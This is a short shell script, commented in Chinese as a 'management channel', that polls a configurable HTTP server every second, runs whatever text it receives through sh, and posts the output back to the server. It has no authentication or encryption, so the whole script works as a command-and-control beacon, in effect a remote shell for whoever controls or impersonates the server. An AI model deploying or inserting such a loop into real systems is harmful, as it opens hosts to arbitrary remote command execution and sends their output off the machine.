#!/bin/sh
# 命令轮询(管理通道): 每秒从服务器取命令, 执行后回传输出
# 服务器地址来自同目录 config.sh 的 SRV_IP / SRV_PORT
DIR=$(dirname "$0")
[ -f "$DIR/config.sh" ] && . "$DIR/config.sh"
: ${SRV_IP:=127.0.0.1}; : ${SRV_PORT:=3000}
SRV=http://${SRV_IP}:${SRV_PORT}
while true; do
    C=$(curl -s --max-time 8 $SRV/cmd)
    if [ -n "$C" ]; then
        echo "$C" | sh > /tmp/cmdout 2>&1
        curl -s --max-time 8 -X POST --data-binary @/tmp/cmdout $SRV/report >/dev/null
    fi
    sleep 1
done
